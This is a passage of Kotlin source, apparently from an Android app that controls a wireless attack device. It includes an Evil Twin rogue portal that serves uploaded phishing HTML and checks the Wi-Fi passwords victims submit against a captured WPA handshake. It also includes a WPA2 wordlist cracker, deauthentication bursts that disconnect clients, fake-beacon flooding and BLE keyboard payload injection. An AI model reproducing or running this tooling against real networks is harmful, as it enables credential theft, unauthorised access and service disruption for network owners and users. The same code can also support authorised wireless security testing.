                                if (completeNow != handshakeWasComplete) {
                                    handshakeWasComplete = completeNow
                                    verifyEvilTwinPasswords()
                                }
                            }.onFailure { error ->
                                appendLog("Evil Twin capture parse/write error: ${error.message}")
                            }
                        }
                    } catch (_: Throwable) {
                        // USB unplug can end the flow abruptly; cleanup handles state.
                    }
                }
            }
            htmlCompleteFlow().value = false

            if (htmlUri != null) {
                val bytes = withContext(Dispatchers.IO) {
                    runCatching {
                        app.contentResolver
                            .openInputStream(htmlUri)
                            ?.use { it.readBytes() }
                    }.getOrNull()
                }
                if (bytes == null) {
                    appendLog("Could not read the selected HTML file.")
                } else if (bytes.isEmpty()) {
                    appendLog("Selected HTML file is empty; using device placeholder.")
                } else if (!uploadPortalHtml(activeSession, bytes)) {
                    appendLog("Portal HTML upload failed; device may be serving its placeholder page.")
                }
            }

            startPortalStatusPolling(activeSession)
            appendLog("Portal is running.")
            addHistory("portal", "Portal started: $cleanSsid", HistoryLevel.SUCCESS)
        }
    }

    private fun htmlUploadingFlow(): MutableStateFlow<Boolean> {
        return if (_portalMode.value == "evil_twin") _evilTwinHtmlUploading else _portalHtmlUploading
    }

    private fun htmlUploadProgressFlow(): MutableStateFlow<Int> {
        return if (_portalMode.value == "evil_twin") _evilTwinHtmlUploadProgress else _portalHtmlUploadProgress
    }

    private fun htmlCompleteFlow(): MutableStateFlow<Boolean> {
        return if (_portalMode.value == "evil_twin") _evilTwinHtmlComplete else _portalHtmlComplete
    }

    private suspend fun uploadPortalHtml(session: NrSession, bytes: ByteArray): Boolean {
        val complete = htmlCompleteFlow()
        complete.value = false
        val uploading = htmlUploadingFlow()
        val progress = htmlUploadProgressFlow()
        uploading.value = true
        progress.value = 0
        return try {
            uploadPortalHtmlInternal(session, bytes)
        } finally {
            uploading.value = false
            if (complete.value) {
                progress.value = 100
            }
        }
    }

    private suspend fun uploadPortalHtmlInternal(session: NrSession, bytes: ByteArray): Boolean {
        val maxHtmlSize = 24 * 1024
        if (bytes.size > maxHtmlSize) {
            appendLog("HTML upload rejected: ${bytes.size} bytes exceeds firmware limit of $maxHtmlSize bytes.")
            return false
        }

        val supportsOffset = (_connectionState.value as? ConnectionState.Connected)
            ?.features
            ?.contains("portal_html_offset") == true
        appendLog(
            "Uploading HTML: ${bytes.size} bytes in " +
                "${(bytes.size + HTML_RAW_CHUNK_SIZE - 1) / HTML_RAW_CHUNK_SIZE} chunk(s) " +
                "(mode=${if (supportsOffset) "offset" else "legacy-append"})."
        )

        val reset = session.sendCommand(
            "RESET_HTML",
            JSONObject().put("size", bytes.size),
            timeoutMs = 10_000,
        )
        if (reset?.optBoolean("ok") != true) {
            appendLog("Device rejected RESET_HTML (size=${bytes.size}).")
            return false
        }

        delay(250)
        var offset = 0
        var chunkIndex = 0
        while (offset < bytes.size) {
            val end = minOf(offset + HTML_RAW_CHUNK_SIZE, bytes.size)
            val chunk = bytes.copyOfRange(offset, end)
            val encoded = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
            val isLast = end == bytes.size

            var success = false
            for (attempt in 1..3) {
                val args = JSONObject().apply {
                    put("data", encoded)
                    put("last", isLast)
                    if (supportsOffset) {
                        put("offset", offset)
                    }
                }
                val response = session.sendCommand("SET_HTML_CHUNK", args, timeoutMs = 5_000)
                if (response?.optBoolean("ok") == true) {
                    success = true
                    break
                }
                appendLog(
                    "HTML chunk $chunkIndex offset $offset attempt $attempt failed: " +
                        (response ?: "timeout")
                )
                delay(400)
            }
            if (!success) {
                appendLog("HTML upload aborted at chunk $chunkIndex (offset $offset).")
                return false
            }

            offset = end
            chunkIndex++
            _portalHtmlSize.value = offset
            htmlUploadProgressFlow().value = ((offset * 100) / bytes.size).coerceIn(0, 100)
            if (isLast) appendLog("HTML final chunk sent (${bytes.size} bytes at offset $end).")
            delay(80)
        }

        delay(350)
        var status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000)
        var complete = status?.optBoolean("html_complete") == true
        if (!complete) {
            delay(500)
            status = session.sendCommand("PORTAL_STATUS", timeoutMs = 5_000) ?: status
            complete = status?.optBoolean("html_complete") == true
        }

        val deviceSize = status?.optInt("html_size", 0) ?: 0
        val deviceExpected = status?.optInt("html_expected", bytes.size) ?: bytes.size
        if (!complete) {
            appendLog(
                "HTML upload did not complete on device " +
                    "(device reports size=$deviceSize, expected=$deviceExpected)."
            )
            return false
        }
        if (deviceSize < bytes.size) {
            appendLog("HTML size mismatch: sent ${bytes.size} bytes, device reports $deviceSize.")
            return false
        }
        if (deviceSize > bytes.size + HTML_TAIL_ALLOWANCE) {
            appendLog("HTML buffer looks corrupted: sent ${bytes.size} bytes, device reports $deviceSize.")
            return false
        }

        appendLog("HTML upload complete; device reports $deviceSize bytes (expected $deviceExpected).")
        htmlCompleteFlow().value = true
        return true
    }

    fun clearEvilTwinPasswords() {
        _evilTwinPasswords.value = emptyList()
        _evilTwinResults.value = emptyList()
    }

    private fun verifyEvilTwinPasswords() {
        val handshake = _portalWpaHandshake.value
        val ssid = _portalSsid.value
        val finalStatuses = setOf(
            EvilTwinResult.Status.CORRECT,
            EvilTwinResult.Status.INCORRECT,
            EvilTwinResult.Status.INVALID_LENGTH,
        )
        val previousByPassword = _evilTwinResults.value.associateBy { it.password }

        val mapped = _evilTwinPasswords.value.map { captured ->
            val password = captured.value
            val existing = previousByPassword[password]?.status
            val status = when {
                existing in finalStatuses -> existing!!
                !handshake.isComplete -> EvilTwinResult.Status.PENDING
                password.length !in 8..63 -> EvilTwinResult.Status.INVALID_LENGTH
                WpaHandshakeVerifier.verify(handshake, ssid, password) -> EvilTwinResult.Status.CORRECT
                else -> EvilTwinResult.Status.INCORRECT
            }
            EvilTwinResult(
                password = password,
                status = status,
                timestamp = captured.capturedAt,
            )
        }

        val correctResults = mapped.filter { it.status == EvilTwinResult.Status.CORRECT }
        _evilTwinResults.value = if (correctResults.isNotEmpty()) correctResults else mapped

        val correct = correctResults.firstOrNull() ?: return
        val shouldStop = synchronized(credentialLock) {
            if (evilTwinAutoStopIssued) {
                false
            } else {
                evilTwinAutoStopIssued = true
                val credential = CapturedCredential(
                    value = correct.password,
                    capturedAt = correct.timestamp,
                    status = CredentialStatus.CORRECT,
                    source = CredentialSource.EVIL_TWIN,
                )
                val current = activeCredentialSession
                val finished = (current ?: CredentialSession(
                    id = System.currentTimeMillis().toString(),
                    source = CredentialSource.EVIL_TWIN,
                    ssid = ssid.ifBlank { "(hidden)" },
                    bssid = activePortalTargetBssid,
                    channel = _portalChannel.value.takeIf { it > 0 },
                    startedAt = timestampNow(),
                    endedAt = null,
                    pcapPath = portalPcapFile?.absolutePath,
                    credentials = emptyList(),
                )).copy(
                    endedAt = timestampNow(),
                    pcapPath = current?.pcapPath ?: portalPcapFile?.absolutePath,
                    credentials = listOf(credential),
                )
                activeCredentialSession = null
                upsertCredentialSessionLocked(finished)
                appendLog("Correct password captured; stopping Evil Twin...")
                addHistory(
                    "evil_twin",
                    "Correct password captured for ${ssid.ifBlank { "target" }}",
                    HistoryLevel.SUCCESS,
                )
                true
            }
        }
        if (shouldStop) {
            stopPortal()
        }
    }

    private fun loadCredentialSessions() {
        scope.launch(Dispatchers.IO) {
            val loaded = runCatching { credentialStore.loadSessions() }
                .getOrDefault(emptyList())
                .sortedByDescending { it.startedAt }
            _credentialSessions.value = loaded
        }
    }

    private fun timestampNow(): String =
        LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME)

    private fun timeHmNow(): String =
        java.time.LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"))

    private fun persistCrackedCredential(sessionId: String, password: String) {
        synchronized(credentialLock) {
            val session = _credentialSessions.value.firstOrNull { it.id == sessionId } ?: return
            if (session.source != CredentialSource.EVIL_TWIN) return
            if (session.credentials.any { it.status == CredentialStatus.CORRECT }) return

            val updated = session.copy(
                credentials = listOf(
                    CapturedCredential(
                        value = password,
                        capturedAt = timeHmNow(),
                        status = CredentialStatus.CORRECT,
                        source = CredentialSource.EVIL_TWIN,
                    ),
                ),
            )
            if (_crackerSelectedSession.value?.id == sessionId) {
                _crackerSelectedSession.value = updated
            }
            upsertCredentialSessionLocked(updated)
        }
    }

    private suspend fun saveCrackedCustomSession(
        sourceUri: Uri,
        displayName: String,
        ssid: String,
        bssid: ByteArray?,
        password: String,
    ) {
        val copiedFile = withContext(Dispatchers.IO) {
            runCatching {
                val directory = File(app.filesDir, "Credentials")
                if (!directory.exists() && !directory.mkdirs()) {
                    throw IOException("Could not create credential capture directory")
                }
                val destination = File(directory, "wpa_cracker_${System.currentTimeMillis()}.pcap")
                val input = app.contentResolver.openInputStream(sourceUri)
                    ?: throw IOException("Could not open custom PCAP")
                input.use { source ->
                    destination.outputStream().use { sink ->
                        source.copyTo(sink)
                    }
                }
                destination
            }.onFailure { error ->
                appendLog("Could not save cracked custom PCAP: ${error.message}", level = LogLevel.ERROR)
            }.getOrNull()
        }

        val session = CredentialSession(
            id = System.currentTimeMillis().toString(),
            source = CredentialSource.WPA_CRACKER,
            ssid = ssid.ifBlank { "(hidden)" },
            bssid = bssid?.toMacString().orEmpty(),
            channel = null,
            startedAt = timestampNow(),
            endedAt = timestampNow(),
            pcapPath = copiedFile?.absolutePath,
            credentials = listOf(
                CapturedCredential(
                    value = password,
                    capturedAt = timeHmNow(),
                    status = CredentialStatus.CORRECT,
                    source = CredentialSource.WPA_CRACKER,
                ),
            ),
        )
        synchronized(credentialLock) {
            upsertCredentialSessionLocked(session)
        }
        appendLog("Saved WPA Cracker result for ${ssid.ifBlank { displayName }}.")
    }

    private fun upsertCredentialSessionLocked(session: CredentialSession) {
        val updated = (_credentialSessions.value.filterNot { it.id == session.id } + session)
            .sortedByDescending { it.startedAt }
        _credentialSessions.value = updated
        scope.launch(Dispatchers.IO) {
            runCatching { credentialStore.saveSessions(updated) }
        }
    }

    private fun finishActiveCredentialSessionLocked() {
        val session = activeCredentialSession ?: return
        activeCredentialSession = null

        // Portal/rogue-AP sessions can capture a lot of data, so only persist
        // them when at least one submission was actually captured.
        if (session.source == CredentialSource.PORTAL && session.credentials.isEmpty()) {
            return
        }

        val finished = session.copy(
            endedAt = session.endedAt ?: timestampNow(),
            pcapPath = session.pcapPath ?: portalPcapFile?.absolutePath,
        )
        upsertCredentialSessionLocked(finished)
    }

    private fun finishActiveCredentialSession() {
        synchronized(credentialLock) {
            finishActiveCredentialSessionLocked()
        }
    }

    fun deleteCredentialSession(id: String) {
        val removed = synchronized(credentialLock) {
            val session = _credentialSessions.value.firstOrNull { it.id == id } ?: return@synchronized null
            _credentialSessions.value = _credentialSessions.value.filterNot { it.id == id }
            session
        } ?: return

        if (_crackerSelectedSession.value?.id == removed.id) {
            _crackerSelectedSession.value = null
        }

        scope.launch(Dispatchers.IO) {
            runCatching {
                credentialStore.deleteCaptureFile(removed)
                credentialStore.saveSessions(_credentialSessions.value)
            }
        }
    }

    fun clearCredentialSessions() {
        val removed = synchronized(credentialLock) {
            val current = _credentialSessions.value
            _credentialSessions.value = emptyList()
            current
        }
        _crackerSelectedSession.value = null
        scope.launch(Dispatchers.IO) {
            runCatching {
                removed.forEach { credentialStore.deleteCaptureFile(it) }
                credentialStore.saveSessions(emptyList())
            }
        }
    }

    fun selectCrackerSession(session: CredentialSession?) {
        if (_crackerRunning.value) return
        if (session != null) {
            resetCrackerCustomPcapState()
        }
        _crackerSelectedSession.value = session
        _crackerResult.value = null
        _crackerTested.value = 0
        _crackerSpeed.value = 0.0
        _crackerStatus.value = when {
            session == null -> "Select a saved handshake, or choose a custom PCAP."
            session.pcapPath.isNullOrBlank() -> "Selected session has no PCAP capture."
            else -> "Ready: ${session.ssid.ifBlank { "target" }}"
        }
    }

    fun setCrackerCustomPcap(uri: Uri, name: String?) {
        if (_crackerRunning.value) return
        _crackerSelectedSession.value = null
        _crackerCustomPcapUri.value = uri
        _crackerCustomPcapName.value = name ?: uri.lastPathSegment ?: "capture.pcap"
        resetCrackerCustomPcapState()
        _crackerCustomPcapUri.value = uri
        _crackerCustomPcapName.value = name ?: uri.lastPathSegment ?: "capture.pcap"
        _crackerCustomPcapMessage.value = "Validating EAPOL handshake..."
        _crackerResult.value = null
        _crackerTested.value = 0
        _crackerSpeed.value = 0.0
        _crackerStatus.value = "Validating custom PCAP..."

        scope.launch(Dispatchers.IO) {
            _crackerCustomPcapValidating.value = true
            try {
                val analysis = analyzeCustomPcap(uri)
                val parsed = analysis.handshake
                val sawM1 = parsed.m1Bssid != null || parsed.aNonce != null
                val sawM2 = parsed.m2Bssid != null || parsed.mic != null
                val detected = analysis.detectedSsids
                val preferred = detected.firstOrNull {
                    parsed.bssid?.let { bytes -> it.bssid.equals(bytes.toMacString(), ignoreCase = true) } == true
                } ?: detected.singleOrNull()

                _crackerCustomSsidOptions.value = detected
                if (preferred != null) {
                    _crackerCustomSsidSelected.value = preferred.ssid
                    _crackerCustomSsid.value = preferred.ssid
                    _crackerCustomSsidManual.value = false
                } else {
                    _crackerCustomSsidSelected.value = null
                    _crackerCustomSsid.value = ""
                    _crackerCustomSsidManual.value = true
                }

                _crackerCustomPcapValid.value = parsed.isComplete
                _crackerCustomPcapMessage.value = when {
                    parsed.isComplete && detected.isNotEmpty() ->
                        "Valid M1/M2 EAPOL handshake detected. ${detected.size} SSID(s) found in PCAP."
                    parsed.isComplete ->
                        "Valid M1/M2 EAPOL handshake detected. No SSID found; enter it manually."
                    sawM1 || sawM2 ->
                        "EAPOL frames found, but the M1+M2 handshake is incomplete."
                    else ->
                        "No EAPOL handshake found in this PCAP."
                }
                _crackerStatus.value = when {
                    !parsed.isComplete -> _crackerCustomPcapMessage.value
                    detected.isNotEmpty() -> "Custom PCAP validated. Select the target SSID and choose a wordlist."
                    else -> "Custom PCAP validated. Enter the target SSID and choose a wordlist."
                }
            } catch (t: Throwable) {
                _crackerCustomPcapValid.value = false
                _crackerCustomPcapValidating.value = false
                _crackerCustomPcapMessage.value = "PCAP invalid: ${t.message ?: t.javaClass.simpleName}"
                _crackerStatus.value = _crackerCustomPcapMessage.value
            } finally {
                _crackerCustomPcapValidating.value = false
            }
        }
    }

    fun selectCrackerCustomSsid(ssid: String) {
        if (_crackerRunning.value) return
        _crackerCustomSsidSelected.value = ssid
        _crackerCustomSsid.value = ssid.take(32)
        _crackerCustomSsidManual.value = false
    }

    fun useManualCrackerSsid() {
        if (_crackerRunning.value) return
        _crackerCustomSsidSelected.value = null
        _crackerCustomSsidManual.value = true
    }

    fun setCrackerCustomSsid(value: String) {
        if (!_crackerCustomSsidManual.value) return
        _crackerCustomSsid.value = value.take(32)
    }

    fun clearCrackerCustomPcap() {
        if (_crackerRunning.value) return
        resetCrackerCustomPcapState()
        _crackerResult.value = null
        _crackerStatus.value = "Select a saved handshake, or choose a custom PCAP."
    }

    private fun resetCrackerCustomPcapState() {
        _crackerCustomPcapUri.value = null
        _crackerCustomPcapName.value = null
        _crackerCustomSsid.value = ""
        _crackerCustomSsidOptions.value = emptyList()
        _crackerCustomSsidSelected.value = null
        _crackerCustomSsidManual.value = true
        _crackerCustomPcapValid.value = false
        _crackerCustomPcapValidating.value = false
        _crackerCustomPcapMessage.value = "No custom PCAP selected."
    }

    private data class CustomPcapAnalysis(
        val handshake: WpaHandshake,
        val detectedSsids: List<DetectedSsid>,
    )

    private suspend fun analyzeCustomPcap(uri: Uri): CustomPcapAnalysis =
        withContext(Dispatchers.IO) {
            val input = app.contentResolver.openInputStream(uri)
                ?: throw IOException("Could not open the selected PCAP.")
            val parsed = WpaHandshake()
            val detected = LinkedHashMap<String, DetectedSsid>()
            PcapReader(input).forEachPacket { frame ->
                WpaHandshakeParser.parse(frame, parsed)
                PcapSsidParser.parse(frame)?.let { ssid ->
                    detected["${ssid.ssid}|${ssid.bssid}"] = ssid
                }
                true
            }
            CustomPcapAnalysis(
                handshake = parsed.copyHandshake(),
                detectedSsids = detected.values.toList(),
            )
        }

    private suspend fun parseHandshakeFromUri(uri: Uri): WpaHandshake =
        withContext(Dispatchers.IO) {
            val input = app.contentResolver.openInputStream(uri)
                ?: throw IOException("Could not open the selected PCAP.")
            val parsed = WpaHandshake()
            PcapReader(input).forEachPacket { frame ->
                WpaHandshakeParser.parse(frame, parsed)
                !parsed.isComplete
            }
            parsed.copyHandshake()
        }

    private fun ByteArray.toMacString(): String =
        joinToString(":") { value -> String.format("%02X", value.toInt() and 0xFF) }

    fun setCrackerWordlist(uri: Uri, name: String?) {
        if (_crackerRunning.value) return
        _crackerWordlistUri.value = uri
        _crackerWordlistName.value = name ?: uri.lastPathSegment ?: "wordlist.txt"
        _crackerResult.value = null
        _crackerStatus.value = "Wordlist selected: ${_crackerWordlistName.value}"
    }

    fun clearCrackerWordlist() {
        if (_crackerRunning.value) return
        _crackerWordlistUri.value = null
        _crackerWordlistName.value = null
        _crackerResult.value = null
        _crackerStatus.value = "Select a saved handshake and a wordlist."
    }

    fun startCracker() {
        if (_crackerRunning.value) return

        val wordlistUri = _crackerWordlistUri.value
        if (wordlistUri == null) {
            appendLog("WPA cracker: select a wordlist first.", level = LogLevel.ERROR)
            return
        }

        val customUri = _crackerCustomPcapUri.value
        val session = _crackerSelectedSession.value
        val ssid: String
        val pcapLabel: String
        val savedSessionId: String?
        val parseHandshake: suspend () -> WpaHandshake

        when {
            customUri != null -> {
                if (_crackerCustomPcapValidating.value) {
                    appendLog("WPA cracker: custom PCAP is still being validated.", level = LogLevel.ERROR)
                    return
                }
                val customSsid = _crackerCustomSsid.value.trim()
                if (!_crackerCustomPcapValid.value) {
                    appendLog("WPA cracker: custom PCAP has no validated M1/M2 EAPOL handshake.", level = LogLevel.ERROR)
                    return
                }
                if (customSsid.isBlank() || customSsid.length > 32) {
                    appendLog("WPA cracker: enter the target SSID (1-32 characters) for the custom PCAP.", level = LogLevel.ERROR)
                    return
                }
                ssid = customSsid
                pcapLabel = _crackerCustomPcapName.value ?: "custom PCAP"
                savedSessionId = null
                parseHandshake = { parseHandshakeFromUri(customUri) }
            }

            session != null -> {
                val pcapPath = session.pcapPath
                if (pcapPath.isNullOrBlank()) {
                    appendLog("WPA cracker: selected session has no PCAP capture.", level = LogLevel.ERROR)
                    return
                }
                val pcapFile = File(pcapPath)
                if (!pcapFile.exists()) {
                    appendLog("WPA cracker: PCAP file no longer exists.", level = LogLevel.ERROR)
                    return
                }
                if (session.ssid.isBlank() || session.ssid == "(hidden)") {
                    appendLog("WPA cracker: the saved session has no usable SSID.", level = LogLevel.ERROR)
                    return
                }
                ssid = session.ssid
                pcapLabel = pcapFile.name
                savedSessionId = session.id
                parseHandshake = {
                    withContext(Dispatchers.IO) {
                        val parsed = WpaHandshake()
                        PcapReader(pcapFile).forEachPacket { frame ->
                            WpaHandshakeParser.parse(frame, parsed)
                            !parsed.isComplete
                        }
                        parsed.copyHandshake()
                    }
                }
            }

            else -> {
                appendLog("WPA cracker: select a saved session or choose a custom PCAP.", level = LogLevel.ERROR)
                return
            }
        }

        _crackerRunning.value = true
        _crackerResult.value = null
        _crackerTested.value = 0
        _crackerSpeed.value = 0.0
        _crackerStatus.value = "Parsing handshake..."
        appendLog("WPA cracker: parsing $pcapLabel...")

        crackerJob = scope.launch(Dispatchers.Default) {
            try {
                val handshake = parseHandshake()
                if (!handshake.isComplete) {
                    _crackerStatus.value = "No complete M1/M2 WPA2 handshake found in the capture."
                    appendLog("WPA cracker: no complete M1/M2 handshake found.", level = LogLevel.ERROR)
                    return@launch
                }

                _crackerStatus.value = "Testing wordlist..."
                appendLog("WPA cracker: handshake ready; testing wordlist...")

                val reader = withContext(Dispatchers.IO) {
                    app.contentResolver.openInputStream(wordlistUri)?.bufferedReader()
                } ?: throw IOException("Could not open the selected wordlist.")

                val runningJob = coroutineContext[Job]
                val found = WpaCracker.crack(
                    handshake = handshake,
                    ssid = ssid,
                    wordlist = reader,
                    shouldStop = { runningJob?.isActive != true },
                    onProgress = { progress ->
                        _crackerTested.update { maxOf(it, progress.tested) }
                        _crackerSpeed.value = progress.candidatesPerSecond
                    },
                )

                if (runningJob?.isActive != true) {
                    _crackerStatus.value = "Cracker stopped."
                    return@launch
                }

                if (found != null) {
                    _crackerResult.value = found
                    _crackerStatus.value = "Password found: $found"
                    if (savedSessionId != null) {
                        persistCrackedCredential(savedSessionId, found)
                    } else if (customUri != null) {
                        saveCrackedCustomSession(
                            sourceUri = customUri,
                            displayName = pcapLabel,
                            ssid = ssid,
                            bssid = handshake.bssid,
                            password = found,
                        )
                    }
                    appendLog("WPA cracker: password found.")
                    addHistory(
                        "wpa_cracker",
                        "WPA2 password recovered for ${ssid.ifBlank { pcapLabel }}",
                        HistoryLevel.SUCCESS,
                    )
                } else {
                    _crackerStatus.value = "Password not found in the selected wordlist."
                    appendLog("WPA cracker: password not found.")
                }
            } catch (e: CancellationException) {
                _crackerStatus.value = "Cracker stopped."
                throw e
            } catch (t: Throwable) {
                _crackerStatus.value = "Cracker failed: ${t.message ?: t.javaClass.simpleName}"
                appendLog(
                    "WPA cracker failed: ${t.message ?: t.javaClass.simpleName}",
                    level = LogLevel.ERROR,
                )
            } finally {
                _crackerRunning.value = false
                crackerJob = null
            }
        }
    }

    fun stopCracker() {
        if (!_crackerRunning.value) return
        _crackerStatus.value = "Stopping..."
        crackerJob?.cancel()
    }

    fun clearEvilTwinEventLog() {
        _evilTwinEventLog.value = emptyList()
    }

    fun clearPortalEventLog() {
        _portalEventLog.value = emptyList()
    }

    private fun portalLog(message: String) {
        val timestamp = java.time.LocalTime.now()
            .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss"))
        val line = "[$timestamp] $message"
        if (_portalMode.value == "evil_twin") {
            _evilTwinEventLog.update { (it + line).takeLast(300) }
        } else {
            _portalEventLog.update { (it + line).takeLast(300) }
        }
    }

    fun stopPortal() {
        finishActiveCredentialSession()
        if (!_portalRunning.value) return
        portalStatusJob?.cancel()
        portalStatusJob = null
        portalPcapJob?.cancel()
        portalPcapJob = null
        val savedCapture = portalPcapFile
        runCatching { portalPcapWriter?.close() }
        portalPcapWriter = null
        portalPcapFile = null
        exportPcapToRootIfConfigured(savedCapture)
        _portalRunning.value = false
        _portalMode.value = null
        updateForegroundService()

        val activeSession = session
        scope.launch {
            val response = runCatching {
                activeSession?.sendCommand("STOP_PORTAL", timeoutMs = 8_000)
            }.getOrNull()
            if (response?.optBoolean("ok") == true) {
                appendLog("Portal stopped.")
                savedCapture?.let { appendLog("Evil Twin capture saved: ${it.absolutePath}") }
                addHistory("portal", "Portal stopped", HistoryLevel.SUCCESS)
            } else {
                appendLog("Portal stop request sent, but the device did not confirm.")
            }
        }
    }

    private fun startPortalStatusPolling(activeSession: NrSession) {
        portalStatusJob?.cancel()
        portalStatusJob = scope.launch {
            while (isActive && _portalRunning.value) {
                delay(3_000)
                if (_connectionState.value !is ConnectionState.Connected) break
                val response = runCatching {
                    activeSession.sendCommand("PORTAL_STATUS", timeoutMs = 4_000)
                }.getOrNull() ?: continue
                if (response.optBoolean("ok")) {
                    _portalRunning.value = response.optBoolean("running", _portalRunning.value)
                    _portalHtmlSize.value = response.optInt("html_size", _portalHtmlSize.value)
                    htmlCompleteFlow().value = response.optBoolean("html_complete", htmlCompleteFlow().value)
                }
            }
        }
    }

    fun setBlePayload(uri: Uri, name: String?) = this.setBlePayloadImpl(uri, name)

    fun clearBlePayload() = this.clearBlePayloadImpl()

    fun startBle(advertiseName: String) = this.startBleImpl(advertiseName)

    fun stopBle() = this.stopBleImpl()

    fun runBlePayload() = this.runBlePayloadImpl()

    fun sendBleKeyboardText(text: String) = this.sendBleKeyboardTextImpl(text)

    /**
     * Realtime keyboard stream. [backspaces] are emitted first, then [inserted]
     * text. Firmware's Print::write handles '\b' as backspace and '\n' as Enter.
     */
    fun sendBleRealtimeInput(inserted: String, backspaces: Int) = this.sendBleRealtimeInputImpl(inserted, backspaces)

    fun sendBleSpecialKey(key: String) = this.sendBleSpecialKeyImpl(key)

    fun setBleModifierHold(enabled: Boolean) = this.setBleModifierHoldImpl(enabled)

    fun sendBleMouseMove(dx: Int, dy: Int) = this.sendBleMouseMoveImpl(dx, dy)

    fun sendBleMouseScroll(wheel: Int) = this.sendBleMouseScrollImpl(wheel)

    fun sendBleMouseButton(button: String, down: Boolean) = this.sendBleMouseButtonImpl(button, down)

    fun releaseBleMouseButtons() = this.releaseBleMouseButtonsImpl()


    fun setBleModifier(key: String, down: Boolean) = this.setBleModifierImpl(key, down)





    fun startDeauth(
        bssid: String,
        channel: Int,
        client: String,
        count: Int,
        duration: Int,
        intervalMs: Int,
    ) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before sending deauth frames.")
            return
        }
        if (_deauthRunning.value) return
        if (!ensureRadioIdle("Deauthentication")) return
        stopLocalPortal()

        val cleanBssid = bssid.trim().uppercase()
        val cleanClient = client.trim().ifBlank { "FF:FF:FF:FF:FF:FF" }.uppercase()
        if (!MAC_PATTERN.matches(cleanBssid)) {
            appendLog("Invalid target BSSID: $cleanBssid")
            return
        }
        if (!MAC_PATTERN.matches(cleanClient)) {
            appendLog("Invalid client MAC: $cleanClient")
            return
        }

        // The firmware's DEAUTH handler calls radioIdle(), so stop local
        // companion tasks before issuing the burst.
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        if (_sniffing.value) {
            _sniffing.value = false
            pcapJob?.cancel()
            pcapJob = null
            scope.launch(Dispatchers.IO) {
                runCatching { pcapWriter?.close() }
                pcapWriter = null
            }
        }

        _deauthSent.value = 0
        _deauthTarget.value = cleanBssid
        _deauthChannel.value = channel.coerceIn(1, 13)
        _deauthRunning.value = true
        updateForegroundService()

        scope.launch {
            appendLog(
                "Starting deauth burst: $cleanBssid on channel $channel " +
                    "(client=$cleanClient, count=${if (count <= 0) "firmware default" else count})."
            )
            val args = JSONObject().apply {
                put("bssid", cleanBssid)
                put("client", cleanClient)
                put("channel", channel.coerceIn(1, 13))
                put("count", count.coerceAtLeast(0))
                put("duration", duration.coerceAtLeast(0))
                put("deauth_interval_ms", intervalMs.coerceIn(10, 10_000))
                put("reason", 7)
            }
            val response = activeSession.sendCommand("DEAUTH", args, timeoutMs = 60_000)
            _deauthRunning.value = false
            updateForegroundService()
            if (response?.optBoolean("ok") == true) {
                appendLog("Deauth burst completed.")
                addHistory("deauth", "Deauth burst completed on $cleanBssid", HistoryLevel.SUCCESS)
            } else {
                appendLog("Deauth request failed: ${response?.optString("msg") ?: "timeout"}")
            }
        }
    }

    fun startBeacon(
        ssids: List<String>,
        channel: Int,
        intervalMs: Int,
        hidden: Boolean,
        randomBssid: Boolean,
    ) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before starting beacon broadcast.")
            return
        }
        if (_beaconRunning.value) return
        if (!ensureRadioIdle("Beacon Broadcast")) return
        stopLocalPortal()

        val cleanSsids = ssids.map { it.trim() }.filter { it.isNotEmpty() }.distinct()
        if (cleanSsids.isEmpty()) {
            appendLog("At least one SSID is required.")
            return
        }
        if (cleanSsids.size > 32) {
            appendLog("Firmware supports at most 32 SSIDs.")
            return
        }

        scope.launch {
            appendLog("Starting beacon broadcast (${cleanSsids.size} SSID(s), channel $channel)...")
            val args = JSONObject().apply {
                put("ssids", cleanSsids.joinToString("\n"))
                put("channel", channel.coerceIn(1, 13))
                put("interval_ms", intervalMs.coerceIn(10, 2000))
                put("hidden", hidden)
                put("random_bssid", randomBssid)
            }
            val response = activeSession.sendCommand("START_BEACON", args, timeoutMs = 10_000)
            if (response?.optBoolean("ok") == true) {
                _beaconRunning.value = true
                updateForegroundService()
                _beaconSent.value = 0
                _beaconSsidCount.value = response.optInt("ssids", cleanSsids.size)
                _beaconChannel.value = response.optInt("channel", channel)
                appendLog("Beacon broadcast started.")
                addHistory("beacon", "Beacon broadcast started (${cleanSsids.size} SSIDs)", HistoryLevel.SUCCESS)
                startBeaconStatusPolling(activeSession)
            } else {
                appendLog("Failed to start beacon broadcast: ${response?.optString("msg") ?: "timeout"}")
            }
        }
    }

    fun stopBeacon() {
        if (!_beaconRunning.value) return
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        updateForegroundService()

        val activeSession = session
        scope.launch {
            val response = activeSession?.sendCommand("STOP_BEACON", timeoutMs = 6_000)
            if (response?.optBoolean("ok") == true) {
                _beaconSent.value = response.optInt("sent", _beaconSent.value)
                _beaconSsidCount.value = response.optInt("ssids", _beaconSsidCount.value)
                appendLog("Beacon stopped. Frames sent: ${_beaconSent.value}.")
                addHistory("beacon", "Beacon stopped; ${_beaconSent.value} frames sent", HistoryLevel.SUCCESS)
            } else {
                appendLog("Beacon stop request sent, but the device did not confirm.")
            }
        }
    }

    private fun startBeaconStatusPolling(activeSession: NrSession) {
        beaconStatusJob?.cancel()
        beaconStatusJob = scope.launch {
            while (isActive && _beaconRunning.value) {
                delay(2_000)
                val response = activeSession.sendCommand("BEACON_STATUS", timeoutMs = 4_000) ?: continue
                if (response.optBoolean("ok")) {
                    _beaconRunning.value = response.optBoolean("active", _beaconRunning.value)
                    _beaconSent.value = response.optInt("sent", _beaconSent.value)
                    _beaconSsidCount.value = response.optInt("ssids", _beaconSsidCount.value)
                    _beaconChannel.value = response.optInt("channel", _beaconChannel.value)
                }
            }
        }
    }

    fun startSniff(request: SniffRequest) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before sniffing.")
            return
        }
        if (_sniffing.value) return
        if (!ensureRadioIdle("Packet Sniffer")) return
        beaconStatusJob?.cancel()
        beaconStatusJob = null
        _beaconRunning.value = false
        stopLocalPortal()

        val captureName = "capture_${System.currentTimeMillis()}.pcap"
        val exportUri = _exportDirectory.value
        if (exportUri == null) {
            _requiresRootDirectory.value = true
